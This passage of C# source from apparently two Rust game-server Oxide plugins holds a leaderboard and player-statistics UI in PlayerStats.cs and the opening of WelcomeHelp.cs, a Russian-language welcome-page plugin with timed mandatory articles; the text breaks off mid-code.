0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 20}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.880208\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeath\",\"parent\":\"PlayerStats_bp2\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.3285359 0.1549479\",\"anchormax\":\"0.6685358 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.92\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_imageskill\",\"parent\":\"bp_killsdeathbp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imageskills}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.89 0.07952497\",\"anchormax\":\"0.98 0.949525\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killtext\",\"parent\":\"bp_killsdeathbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП в разных категориях\",\"fontSize\":24,\"align\":\"MiddleLeft\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3960784\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.02415806 0\",\"anchormax\":\"0.9715356 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp1\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0 0 0 0.1048265\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.46\",\"anchormax\":\"0.5 0.92\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext1\",\"parent\":\"bp_killsdeathbp1\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП 10 убийц:\",\"fontSize\":20,\"align\":\"MiddleCenter\",\"color\":\"1 0.4223743 0.4223743 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.8779236\",\"anchormax\":\"1 0.9779239\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_killsdeathbp1\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 10 убийц}\",\"fontSize\":17,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.8779238\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp1\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0 0 0 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.5 0.4616926\",\"anchormax\":\"1.001679 0.9216925\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext1\",\"parent\":\"bp_killsdeathbp1\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП 10 рейдеров:\",\"fontSize\":20,\"align\":\"MiddleCenter\",\"color\":\"1 0.4223743 0.4223743 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.8779236\",\"anchormax\":\"1 0.9779239\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_killsdeathbp1\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 10 рейдеров}\",\"fontSize\":17,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.8779238\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp2\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0 0 0 0.1048265\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.5 0\",\"anchormax\":\"1 0.46\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext3\",\"parent\":\"bp_killsdeathbp2\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП 10 смертей:\",\"fontSize\":20,\"align\":\"MiddleCenter\",\"color\":\"1 0.4223743 0.4223743 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.8779236\",\"anchormax\":\"1 0.9779239\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_killsdeathbp2\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 10 смертей}\",\"fontSize\":17,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.8779238\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp2\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0 0 0 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"0.5 0.46\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext6\",\"parent\":\"bp_killsdeathbp2\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП 10 по ресурсам:\",\"fontSize\":20,\"align\":\"MiddleCenter\",\"color\":\"1 0.4223743 0.4223743 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.8779236\",\"anchormax\":\"1 0.9779239\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_killsdeathbp2\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 10 ресурсы}\",\"fontSize\":17,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.8779238\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1\",\"parent\":\"PlayerStats_bp2\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.6985359 0.1542709\",\"anchormax\":\"0.9485359 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1rait\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"stat\",\"color\":\"0.2039216 0.2901961 0.2666667 0.5137255\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.2101457\",\"anchormax\":\"0.9999998 0.3001456\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1raittext\",\"parent\":\"bp_player1rait\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"< НАЗАД >\",\"fontSize\":28,\"align\":\"MiddleCenter\",\"color\":\"0.317647 0.7411765 0.522305 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3233584\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1exitbp\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"closestat2\",\"color\":\"0.2078431 0.2901961 0.2745098 0.5137255\"},{\"type\":\"NeedsCursor\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.08926517\",\"anchormax\":\"0.9999999 0.1792652\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1exitexit\",\"parent\":\"bp_player1exitbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"< ВЫХОД >\",\"fontSize\":28,\"align\":\"MiddleCenter\",\"color\":\"0.3137255 0.7411765 0.5215687 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3233584\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp2\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0 0 0 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.33\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext5\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{ТОП 10 время}\",\"fontSize\":17,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.32\",\"anchormax\":\"1 0.92\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.92\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext4\",\"parent\":\"bp_killsdeathbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Топ 15 по онлайну\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3921569\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]";

        void CreateUINext(BasePlayer player)
        {
            topList topdata = calcSum();
            string topTop = topdata.arr;

            IOrderedEnumerable<KeyValuePair<ulong, PlayerData>> items = from pair in data orderby pair.Value.pvp.kills descending select pair;

            int i = 1;
            string topPvp = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                topPvp = topPvp + i.ToString() + ". " + name + " - " + pair.Value.pvp.kills.ToString() + "\n";
                i++;
                if (i > 10) break;
            }

            int i1 = 1;
            
            items = from pair in data orderby pair.Value.pvp.deaths descending select pair;
            string topPve = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                topPve = topPve + i1.ToString() + ". " + name + " - " + pair.Value.pvp.deaths.ToString() + "\n";
                i1++;
                if (i1 > 10) break;
            }

            items = from pair in data orderby pair.Value.minutes descending select pair;
            i = 1;
            string topTime = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                topTime = topTime + i.ToString() + ". " + name + " - " + FormatTime(TimeSpan.FromMinutes(pair.Value.minutes)) + "\n";
                i++;
                if (i > 15) break;
            }

            items = from pair in data orderby (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre + pair.Value.gather.hqmetalOre) descending select pair;
            i = 1;
            string topGve = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                topGve = topGve + i.ToString() + ". " + name + " - " + (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre +
                pair.Value.gather.hqmetalOre).ToString() + "\n";
                i++;
                if (i > 10) break;
            }

            items = from pair in data orderby (pair.Value.raid.Explosive + pair.Value.raid.RocketLaunched) descending select pair;
            i = 1;
            string topRaid = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                topRaid = topRaid + i.ToString() + ". " + name + " - " + (pair.Value.raid.Explosive + pair.Value.raid.RocketLaunched).ToString() + "\n";
                i++;
                if (i > 10) break;
            }

            CuiHelper.DestroyUi(player, "PlayerStats_bp2");
            CuiHelper.AddUi(player,
                NextGUI.Replace("{name}", data[player.userID].name.ToString())
                .Replace("{imageskills}", Images["imageskills"])
                .Replace("{ТОП 20}", topTop)
                .Replace("{ТОП 10 убийц}", topPvp)
                .Replace("{ТОП 10 смертей}", topPve)
                .Replace("{ТОП 10 время}", topTime)
                .Replace("{ТОП 10 ресурсы}", topGve)
                .Replace("{ТОП 10 рейдеров}", topRaid));
        }


        void CreateUI(BasePlayer player)
        {
            float points = kills * data[player.userID].pvp.kills - deaths * data[player.userID].pvp.deaths + resGather * (data[player.userID].gather.wood + data[player.userID].gather.stone + data[player.userID].gather.metalOre + data[player.userID].gather.sulfurOre + data[player.userID].gather.hqmetalOre) +
            Raider * (data[player.userID].raid.Beancan + data[player.userID].raid.F1 + data[player.userID].raid.High + data[player.userID].raid.Incendiary + data[player.userID].raid.Rocket + data[player.userID].raid.Satchel + data[player.userID].raid.TimedExpl) + level;

            CuiHelper.DestroyUi(player, "PlayerStats_bp");
            CuiHelper.AddUi(player,
                GUI.Replace("{name}", data[player.userID].name.ToString())
                .Replace("{убийств}", data[player.userID].pvp.kills.ToString())
                .Replace("{смертей}", data[player.userID].pvp.deaths.ToString())

                .Replace("{дерево}", data[player.userID].gather.wood.ToString())
                .Replace("{камень}", data[player.userID].gather.stone.ToString())
                .Replace("{руда}", data[player.userID].gather.metalOre.ToString())
                .Replace("{серная руда}", data[player.userID].gather.sulfurOre.ToString())
                .Replace("{МВК}", data[player.userID].gather.hqmetalOre.ToString())

                .Replace("{f1}", data[player.userID].raid.F1.ToString())
                .Replace("{c4}", data[player.userID].raid.TimedExpl.ToString())
                .Replace("{gbeancan}", data[player.userID].raid.Beancan.ToString())
                .Replace("{Satchel}", data[player.userID].raid.Satchel.ToString())

                .Replace("{rocket}", data[player.userID].raid.Rocket.ToString())
                .Replace("{incend}", data[player.userID].raid.Incendiary.ToString())
                .Replace("{hight}", data[player.userID].raid.High.ToString())

                .Replace("{время на сервере}", FormatTime(TimeSpan.FromMinutes(data[player.userID].minutes)))

                .Replace("{imagesplayer}", m_FileManager.GetPng("avatar" + player.userID))
                .Replace("{imagesplayers}", Images["imagesplayers"])
                .Replace("{imagesgather}", Images["imagesgather"])
                .Replace("{imagesgather1}", Images["imagesgather1"])
                .Replace("{imageskills}", Images["imageskills"])
                );
        }

        public static string FormatTime(TimeSpan time)
        {
            string result = string.Empty;
            if (time.Days != 0)
                result += $"{Format(time.Days, "дней", "дня", "день")} ";

            if (time.Hours != 0)
                result += $"{Format(time.Hours, "часов", "часа", "час")} ";

            if (time.Minutes != 0)
                result += $"{Format(time.Minutes, "минут", "минуты", "минуту")} ";

            return result;
        }

        private static string Format(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units} {form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2}";

            return $"{units} {form3}";
        }

        void drawWindow(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "StatsParent");
            CuiHelper.DestroyUi(player, "PlayerStats_bp");
            CuiHelper.DestroyUi(player, "PlayerStats_bp2");
            CreateUI(player);
        }


        topList calcSum()
        {
            topList a = new topList();
            a.list = new List<string>();
            var culture = new CultureInfo("en-GB");
            a.list.Add(DateTime.Now.ToString(culture));
            IOrderedEnumerable<KeyValuePair<ulong, PlayerData>> items = from pair in data
                                                                        orderby
            (kills * pair.Value.pvp.kills - deaths * pair.Value.pvp.deaths + resGather * (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre + pair.Value.gather.hqmetalOre) +
                Raider * (pair.Value.raid.Beancan + pair.Value.raid.F1 + pair.Value.raid.High + pair.Value.raid.Incendiary + pair.Value.raid.Rocket + pair.Value.raid.Satchel + pair.Value.raid.TimedExpl) + level)
            descending
                                                                        select pair;
            int i = 1;
            a.arr = "";
            foreach (KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if (name == null) name = "Неизвестный";
                string newstring = i.ToString() + ". " + name + " - " + (kills * pair.Value.pvp.kills - deaths * pair.Value.pvp.deaths + resGather * (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre + pair.Value.gather.hqmetalOre) +
                Raider * (pair.Value.raid.Beancan + pair.Value.raid.F1 + pair.Value.raid.High + pair.Value.raid.Incendiary + pair.Value.raid.Rocket + pair.Value.raid.Satchel + pair.Value.raid.TimedExpl) + level).ToString() + "\n";
                a.arr = a.arr + newstring;
                newstring = newstring.Replace("\n", "");
                a.list.Add(newstring);
                i++;
                if (i > topCount) break;
            }
            return a;
        }

        class topList
        {
            public List<string> list;
            public string arr;
        }

        #region Help on Next update
        //float points = kills * data[player.userID].pvp.kills - deaths * data[player.userID].pvp.deaths + resGather * (data[player.userID].gather.wood + data[player.userID].gather.stone + data[player.userID].gather.metalOre + data[player.userID].gather.sulfurOre + data[player.userID].gather.hqmetalOre) +
        //   resQuarry * (data[player.userID].quarry.stone + data[player.userID].quarry.metal + data[player.userID].quarry.metalOre + data[player.userID].quarry.sulfurOre + data[player.userID].quarry.hqmetal + data[player.userID].quarry.hqmetalOre) + level;

        #endregion


        void writeTop()
        {
            topList topdata = calcSum();
            topFile.WriteObject(topdata.list);
        }


        //cache
        BasePlayer findPlayer(string name)
        {
            List<BasePlayer> list = new List<BasePlayer>();
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (player.displayName.ToLower().Contains(name.ToLower())) list.Add(player);
            }
            if (list.Count == 0) return null;
            if (list.Count > 1) return null;
            return list[0];
        }

        void StartSleeping(BasePlayer player)
        {
            if (player.IsSleeping())
                return;
            player.SetPlayerFlag(BasePlayer.PlayerFlags.Sleeping, true);
            if (!BasePlayer.sleepingPlayerList.Contains(player))
                BasePlayer.sleepingPlayerList.Add(player);
            player.CancelInvoke("InventoryUpdate");
        }

        #region Images Load

        private GameObject FileManagerObject;
        private FileManager m_FileManager;
        /// <summary>
        /// Инициализация скрипта взаимодействующего с файлами сервера
        /// </summary>
        void InitFileManager()
        {
            FileManagerObject = new GameObject("PlayerStats_FileManagerObject");
            m_FileManager = FileManagerObject.AddComponent<FileManager>();
        }
        class FileManager : MonoBehaviour
        {
            int loaded = 0;
            int needed = 0;

            public bool IsFinished => needed == loaded;
            const ulong MaxActiveLoads = 10;
            Dictionary<string, FileInfo> files = new Dictionary<string, FileInfo>();


            private class FileInfo
            {
                public string Url;
                public string Png;
            }


            public string GetPng(string name) => files[name].Png;

            public IEnumerator LoadFile(string name, string url, int size = -1)
            {
                if (files.ContainsKey(name) && files[name].Url == url && !string.IsNullOrEmpty(files[name].Png)) yield break;
                files[name] = new FileInfo() { Url = url };
                needed++;
                yield return StartCoroutine(LoadImageCoroutine(name, url, size));
            }

            IEnumerator LoadImageCoroutine(string name, string url, int size = -1)
            {
                using (WWW www = new WWW(url))
                {
                    yield return www;
                    if (string.IsNullOrEmpty(www.error))
                    {
                        var bytes = www.bytes;

                        var entityId = CommunityEntity.ServerInstance.net.ID;
                        var crc32 = FileStorage.server.Store(bytes, FileStorage.Type.png, entityId).ToString();
                        files[name].Png = crc32;
                    }
                }
                loaded++;
            }
            #endregion
        }

    }
}
               

// --- End of file: PlayerStats.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/WelcomeHelp.cs ---
// --- Original Local Path: WelcomeHelp.cs ---

using System.Collections;
using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("WelcomeHelp", "Empty", "0.0.41")]
    public class WelcomeHelp : RustPlugin
    {
        #region Classes

        private class Configs
        {
            public class Interface
            {
                [JsonProperty("Текст заголовка (над выделенным блоком), советую оставить пустым")]
                public string HeaderText = "Text";
                [JsonProperty("Текст в разделителе")]
                public string DelimiterText = "Привет, мы подготивили тебе несколько статей, пожалуйста удели им внимание\n" +
                                              "Некоторые из них являются обязательными для чтения (<color=#DC143C><b>X</b></color>), без них ты <b>не сможешь начать играть</b>";

                [JsonProperty("Надпись в левом нижнем углу")]
                public string LeftDownText = "ГРУППА\n" +
                                             "<b>vk.com/huntpub</b>";
                [JsonProperty("Напись в правом нижнем углу")]
                public string RightDownText = "МАГАЗИН\n" +
                                              "<b>rusthuntstores.gamestores.ru</b>";

                [JsonProperty("Надпись на кнопке")]
                public string ButtonText = "ВЕРНУТЬСЯ В ИГРУ";
            }

            [JsonProperty("Показывает при входе игрока на сервер")]
            public bool ShowOnJoin = true;
            [JsonProperty("Настройки дизайна")]
            public Interface InterfaceSettings = new Interface();
            [JsonProperty("Список возможных страниц")]
            public List<Page> Pages = new List<Page>();

            public static Configs GetNewConf()
            {
                return new Configs
                {
                    Pages = new List<Page>
                    {
                        new Page
                        {
                            DisplayName = "Система BattlePass",
                            Text =
                                "У нас новая, уникальная система BattlePass. <b>Зачем?</b> - спросите вы. Это помогает вам получить больше ресурсов!\n" +
                                "Есть много разных видов фракций для который есть отдельные мисиии! Выполни получи награду! <b>/bp</b>!\n\n" +
                                "Сменить можно в любое время любую фракцию!.",
                            Important = true,
                            ReadTime = 10
                        },
                        new Page
                        {
                            DisplayName = "Другая информация",
                            Text =
                                "В нашей группе много чего нового зайди. <b>https://vk.com/huntpub</b> - Чтобы узнавать больше информации!!\n",
                            Important = false,
                            ReadTime = 0
                        },
                    }
                };
            }
        }

        private class Page
        {
            [JsonProperty("Короткое название в главном меню")]
            public string DisplayName;
            [JsonProperty("Текст в вложенном окне")]
            public string Text;
            [JsonProperty("Обязательно для чтения")]
            public bool Important;
            [JsonProperty("Время обязательного чтения (нельзя свернуть пункт)")]
            public int ReadTime = 10;

            public void Draw(BasePlayer player)
            {
                CuiElementContainer container = new CuiElementContainer();
                CuiHelper.DestroyUi(player, Layer + ".Text");

                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "0 0", OffsetMax = "0 0" },
                    Image = { FadeIn = 0.3f, Color = "0 0 0 0.9", Material = "assets/content/ui/uibackgroundblur.mat" }
                }, Layer, Layer + ".Text");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    Text = { FadeIn = 0.3f, Text = $"<size=34>{DisplayName}</size>\n" + Text, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 18 }
                }, Layer + ".Text");

                if (!Important || PlayerInfos[player.userID].ReadArticles.Contains(DisplayName) || ReadTime <= 0)
                {
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100", OffsetMax = "0 0" },
                        Button = { Color = "0 0 0 0", Command = "chat.say /info" },
                        Text = { Text = "" }
                    }, Layer + ".Text");

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.2", OffsetMax = "0 0" },
                        Text = { Text = $"Нажмите в любом месте, чтобы закрыть статью", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 22, Color = "1 1 1 0.4" }
                    }, Layer + ".Text", Layer + ".Notify");
                }
                else ServerMgr.Instance.StartCoroutine(DrawCounter(player));

                if (!PlayerInfos[player.userID].ReadArticles.Contains(DisplayName))
                    PlayerInfos[player.userID].ReadArticles.Add(DisplayName);

                CuiHelper.AddUi(player, container);
            }

            public IEnumerator DrawCounter(BasePlayer player)
            {
                player.SetPlayerFlag(BasePlayer.PlayerFlags.Unused2, true);

                CuiElementContainer container = new CuiElementContainer();
                for (int i = 0; i < ReadTime; i++)
                {
                    if (player == null || !player.IsConnected)
                    {
                        player.SetPlayerFlag(BasePlayer.PlayerFlags.Unused2, false);
                        yield return 0;
                    }

                    container.Clear();

                    CuiHelper.DestroyUi(player, Layer + ".Notify");
                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.2", OffsetMax = "0 0" },
                        Text = { Text = $"Пожалуйста, уделите этой статье ещё: <b>{ReadTime - i} сек.</b>", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 22, Color = "1 1 1 0.4" }
                    }, Layer + ".Text", Layer + ".Notify");

                    CuiHelper.AddUi(player, container);
                    yield return new WaitForSeconds(1);
                }
                container.Clear();

                CuiHelper.DestroyUi(player, Layer + ".Notify");
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.2", OffsetMax = "0 0" },
                    Text = { Text = $"Нажмите в любом месте, чтобы закрыть статью", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 22, Color = "1 1 1 0.4" }
                }, Layer + ".Text", Layer + ".Notify");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "-100 -100", AnchorMax = "100 100", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = "chat.say /info" },
                    Text = { Text = "" }
                }, Layer + ".Text");

                CuiHelper.AddUi(player, container);

                player.SetPlayerFlag(BasePlayer.PlayerFlags.Unused2, false);
                yield return 0;
            }
        }

        private class PlayerInfo
        {
            [JsonProperty("Прочитанные статьи")]
            public HashSet<string> ReadArticles = new HashSet<string>();
        }

        #endregion

        #region Variables

        private static Hash<ulong, PlayerInfo> PlayerInfos = new Hash<ulong, PlayerInfo>();
        private Configs Configuration = new Configs();

        #endregion

        #region Commands

        [ConsoleCommand("UI_WelcomeHelpHandler")]
        private void CmdChatInfoMenu(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            if (player == null || !args.HasArgs(1)) return;

            switch (args.Args[0].ToLower())
            {
                /*case "switch":
                {
                    if (SkipPlayers.Contains(player.userID)) SkipPlayers.Remove(player.userID);
                    else SkipPlayers.Add(player.userID);

                    CuiHelper.DestroyUi(player, Layer + ".CurrentSwitch");
                    CuiElementContainer container = new CuiElementContainer();

                    if (SkipPlayers.Contains(player.userID))
                    {
                        container.Add(new CuiButton
                        {
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 0", OffsetMax = "0 25" },
                            Button = { FadeIn = 1f, Color = "0 0 0 0.107", Material = "", Command = "UI_WelcomeHelpHandler switch" },
                            Text = { FadeIn = 1f, Text = "<color=#DC143C><b>X</b></color> Не показывать при входе в игру", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 15, Color = "1 1 1 0.4" }
                        }, Layer, Layer + ".CurrentSwitch");
                    }
                    else
                    {
                        container.Add(new CuiButton
                        {
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 0", OffsetMax = "0 25" },
                            Button = { FadeIn = 1f, Color = "0 0 0 0.107", Material = "", Command = "UI_WelcomeHelpHandler switch" },
